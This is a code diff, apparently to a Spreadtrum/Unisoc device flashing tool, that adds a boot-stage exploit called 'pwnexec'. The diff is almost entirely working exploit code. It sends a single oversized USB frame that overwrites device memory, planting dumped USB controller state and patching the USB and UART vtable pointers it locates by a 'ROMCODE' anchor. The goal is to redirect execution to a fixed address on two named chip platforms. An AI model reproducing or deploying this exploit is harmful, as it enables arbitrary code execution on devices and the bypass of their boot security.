@@ -8,6 +8,8 @@ extern int g_spl_size;
 extern int g_rpmb_pagecnt;
 extern int g_w_force;
 extern int w_force_repart;
+extern uint8_t *g_fdl1_img;
+extern size_t g_fdl1_img_size;
 static int isCancel;
 void signal_handler(int sig) {
 	isCancel = 1;
@@ -3819,4 +3821,226 @@ void do_e_checkpwn(spdio_t *io, int selected_ab) {
 	encode_msg_nocpy(io, BSL_CMD_E_CHECKPWN, 32);
 	if (send_and_check(io))
 		print_mem(stderr, io->raw_buf + 4, READ16_BE(io->raw_buf + 2));
+}
+
+static const uint8_t fdl1_usb_ctrl_9360[] = {
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x80, 0x68, 0x00, 0x65, 0x20, 0x00, 0x00, 0x10, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x14, 0xff, 0x8e, 0x80, 0x20, 0x00, 0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x80, 0x68, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x20, 0x00, 0x06, 0x01, 0x00, 0x01,
+	0x14, 0xff, 0x8e, 0x80, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x20, 0x00, 0x05, 0x01, 0x00, 0x01,
+};
+
+static const uint8_t fdl1_usb_ctrl_9632[] = {
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x80, 0x44, 0x00, 0x65, 0x20, 0x00, 0x00, 0x10, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x14, 0xff, 0x8e, 0x80, 0x20, 0x00, 0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x80, 0x44, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x20, 0x00, 0x06, 0x01, 0x00, 0x01,
+	0x14, 0xff, 0x8e, 0x80, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x20, 0x00, 0x05, 0x01, 0x00, 0x01,
+};
+
+typedef struct {
+	const char *name;
+	uint32_t pkt0_dst;
+	uint32_t img_base;
+	uint32_t usb_ctrl_addr;
+	uint64_t exec_entry;
+	const uint8_t *usb_ctrl;
+	unsigned usb_ctrl_size;
+} fdl1_layout_t;
+
+static const fdl1_layout_t fdl1_layouts[] = {
+	{ "9360", 0x6500339Cu, 0x65008000u, 0x65005BC0u, 0xBE000000ull, fdl1_usb_ctrl_9360, sizeof(fdl1_usb_ctrl_9360) },
+	{ "9632", 0x65000F9Cu, 0x65008000u, 0x650037C0u, 0xBE000000ull, fdl1_usb_ctrl_9632, sizeof(fdl1_usb_ctrl_9632) },
+};
+
+static int find_usb_table(const uint8_t *img, size_t size, uint32_t img_base,
+	uint32_t *tbl_out) {
+	static const char anchor[] = "ROMCODE";
+	const size_t alen = sizeof(anchor) - 1;
+	size_t i;
+	for (i = 0; i + alen <= size; i += 8) {
+		size_t p;
+		if (memcmp(img + i, anchor, alen)) continue;
+		p = i - 8;
+		while (p >= 8) {
+			uint32_t v, hi;
+			memcpy(&v, img + p - 8, 4);
+			memcpy(&hi, img + p - 4, 4);
+			if (hi || v < img_base || v >= img_base + size) break;
+			p -= 8;
+		}
+		*tbl_out = img_base + (uint32_t)p;
+		DBG_LOG("pwnexec: usb vtable 0x%x\n", (unsigned)*tbl_out);
+		return 1;
+	}
+	return 0;
+}
+
+static int is_ptrtab(const uint8_t *img, size_t size, uint32_t img_base, size_t off, int n) {
+	int i;
+	for (i = 0; i < n; i++) {
+		uint32_t v, hi;
+		if (off + (size_t)i * 8 + 8 > size) return 0;
+		memcpy(&v, img + off + (size_t)i * 8, 4);
+		memcpy(&hi, img + off + (size_t)i * 8 + 4, 4);
+		if (hi || v < img_base || v >= img_base + size) return 0;
+	}
+	return 1;
+}
+
+static int find_uart_tables(const uint8_t *img, size_t size, uint32_t img_base,
+	uint32_t usb_first, uint32_t *out, int max_out) {
+	uint32_t first;
+	size_t off, off2;
+	int n = 0;
+	for (off = 0; off + 0x40 <= size && n + 2 <= max_out; off += 8) {
+		if (!is_ptrtab(img, size, img_base, off, 8)) continue;
+		if (off >= 8 && is_ptrtab(img, size, img_base, off - 8, 8)) continue;
+		memcpy(&first, img + off, 4);
+		if (first >= usb_first) continue;
+		for (off2 = off + 8; off2 + 0x40 <= size; off2 += 8)
+			if (!memcmp(img + off, img + off2, 0x40)) break;
+		if (off2 + 0x40 > size) continue;
+		out[n++] = img_base + (uint32_t)off;
+		out[n++] = img_base + (uint32_t)off2;
+		DBG_LOG("pwnexec: uart vtable 0x%x (twin 0x%x)\n",
+			(unsigned)out[n - 2], (unsigned)out[n - 1]);
+	}
+	return n;
+}
+
+static int exp_raw_write(spdio_t *io, uint8_t *buf, unsigned len) {
+#if USE_LIBUSB
+	int sent = 0;
+	int err = libusb_bulk_transfer(io->dev_handle, io->endp_out, buf, (int)len, &sent, io->timeout);
+	if (err < 0) {
+		DBG_LOG("bulk transfer failed: %s\n", libusb_error_name(err));
+		return -1;
+	}
+	return sent == (int)len ? 0 : -1;
+#else
+	return call_Write(io->handle, buf, (int)len) == (int)len ? 0 : -1;
+#endif
+}
+
+int hijack_fdl1(spdio_t *io, const char *img_fn, const char *platform) {
+	uint8_t *img, *payload, *enc, end_byte = HDLC_HEADER;
+	size_t img_size = 0, len, poff, nblocks = 0, blk = 0, keep = 0;
+	const fdl1_layout_t *L = &fdl1_layouts[0];
+	uint32_t dst_addr, img_addr, patch_at[10];
+	int npatch = 0;
+	uint64_t hijack_val;
+	unsigned chunk = 512; // chunk <= 768
+	int k;
+	unsigned long long time0;
+
+
+	int np = (int)(sizeof(fdl1_layouts) / sizeof(fdl1_layouts[0]));
+	for (k = 0; k < np; k++) if (!strcmp(fdl1_layouts[k].name, platform)) break;
+	if (k == np) { DBG_LOG("pwnexec: unknown platform %s\n", platform); return 0; }
+	L = &fdl1_layouts[k];
+
+	dst_addr = L->pkt0_dst;
+	img_addr = L->img_base;
+	hijack_val = L->exec_entry;
+	DBG_LOG("pwnexec: platform %s: dst 0x%x, image base 0x%x, usb ctrl 0x%x\n",
+		L->name, (unsigned)dst_addr, (unsigned)img_addr, (unsigned)L->usb_ctrl_addr);
+
+	img = g_fdl1_img;
+	img_size = g_fdl1_img_size;
+	if (img_fn) {
+		size_t _n = 0;
+		uint8_t *_m = loadfile(img_fn, &_n, 0);
+		if (_m) {
+			img = _m;
+			img_size = _n;
+		}
+	}
+
+	uint32_t usb_tbl = 0, usb_first = 0, uart_tbls[4];
+	int nu, i;
+	if (!find_usb_table(img, 0x1B800, img_addr, &usb_tbl)) {
+		free(img);
+		DBG_LOG("pwnexec: no \"ROMCODE\" anchor\n"); return 0;
+	}
+	memcpy(&usb_first, img + (usb_tbl - img_addr), 4);
+	patch_at[npatch++] = usb_tbl + 8;
+	nu = find_uart_tables(img, 0x1B800, img_addr, usb_first, uart_tbls, 4);
+	for (i = 0; i < nu && npatch < (int)(sizeof(patch_at) / sizeof(patch_at[0])); i++)
+		patch_at[npatch++] = uart_tbls[i] + 0x18;
+	DBG_LOG("pwnexec: %d hijack slot(s) will be patched\n", npatch);
+
+	len = (size_t)(img_addr - dst_addr) + 0x1B800;
+	payload = (uint8_t *)calloc(1, len);
+	if (!payload) ERR_EXIT("malloc failed\n");
+	keep = img_size < 0x1B800 ? img_size : 0x1B800;
+	memcpy(payload + (img_addr - dst_addr), img, keep);
+
+	DBG_LOG("pwnexec: image %s, %u bytes (0..0x%x)\n", img_fn, (unsigned)img_size, (unsigned)(img_size - 1));
+	DBG_LOG("pwnexec: frame = 0x7e + %u bytes + 0x7e, written to 0x%x..0x%x\n",
+		(unsigned)len, (unsigned)dst_addr, (unsigned)(dst_addr + len - 1));
+	DBG_LOG("pwnexec:   0x%x..0x%x <- fill 0x00 (%u bytes)\n",
+		(unsigned)dst_addr, (unsigned)(img_addr - 1), (unsigned)(img_addr - dst_addr));
+	DBG_LOG("pwnexec:   0x%x..0x%x <- image\n", (unsigned)img_addr, (unsigned)(dst_addr + len - 1));
+	free(img);
+	if (img == g_fdl1_img) g_fdl1_img = NULL;
+
+	size_t off = (size_t)(L->usb_ctrl_addr - dst_addr);
+	memcpy(payload + off, L->usb_ctrl, L->usb_ctrl_size);
+	DBG_LOG("pwnexec:   0x%x..0x%x <- USB ctrl/desc (%s dump, %u bytes)\n",
+		(unsigned)L->usb_ctrl_addr,
+		(unsigned)(L->usb_ctrl_addr + L->usb_ctrl_size - 1),
+		L->name, L->usb_ctrl_size);
+
+	for (k = 0; k < npatch; k++) {
+		size_t off = (size_t)(patch_at[k] - dst_addr);
+		*(uint64_t *)(payload + off) = hijack_val;
+		DBG_LOG("pwnexec:   [0x%x] = 0x%llx bytes ", (unsigned)patch_at[k], (unsigned long long)hijack_val);
+		print_mem(stderr, payload + off, 8);
+	}
+
+	enc = (uint8_t *)malloc((size_t)chunk * 2 + 2);
+	if (!enc) ERR_EXIT("malloc failed\n");
+
+	time0 = GetTickCount64();
+	if (exp_raw_write(io, &end_byte, 1)) ERR_EXIT("usb_send failed (frame head)\n");
+	for (poff = 0; poff < len; ) {
+		int n = spd_transcode_max(payload + poff, (int)(len - poff), (int)chunk);
+		int e = spd_transcode(enc, payload + poff, n);
+		nblocks++;
+		blk++;
+		if (exp_raw_write(io, enc, (unsigned)e)) {
+			DBG_LOG("\npwnexec: FAILED at block %u: payload 0x%x..0x%x -> device 0x%x..0x%x, wire %d\n",
+				(unsigned)blk, (unsigned)poff, (unsigned)(poff + n - 1),
+				(unsigned)(dst_addr + poff), (unsigned)(dst_addr + poff + n - 1), e);
+			DBG_LOG("pwnexec: delivered %u/0x%x payload bytes in %llums,"
+				" last device byte written: 0x%x\n",
+				(unsigned)poff, (unsigned)len,
+				GetTickCount64() - time0, (unsigned)(dst_addr + poff - 1));
+			ERR_EXIT("usb_send failed\n");
+		}
+#if USE_LIBUSB
+		if (!((unsigned)e % io->endp_out_blk)) {
+			if (exp_raw_write(io, NULL, 0)) ERR_EXIT("usb_send (zlp) failed at payload 0x%x\n", (unsigned)poff);
+		}
+#endif
+		poff += n;
+		if (io->verbose >= 1)
+			DBG_LOG("pwnexec: device 0x%x..0x%x\n",
+				(unsigned)(dst_addr + poff - n), (unsigned)(dst_addr + poff - 1));
+		else
+			print_progress_bar(poff, len, time0);
+		usleep(1000);
+	}
+	if (exp_raw_write(io, &end_byte, 1)) ERR_EXIT("usb_send failed (frame tail)\n");
+	if (io->verbose < 1) print_progress_bar(len, len, time0);
+	unsigned long long ms = GetTickCount64() - time0 + 1;
+	DBG_LOG("\npwnexec: frame sent: %u payload bytes, %u blocks, %llums (%.0f KB/s)\n",
+		(unsigned)len, (unsigned)nblocks, ms, (double)len / (double)ms);
+	free(enc);
+	free(payload);
+	return 1;
 }
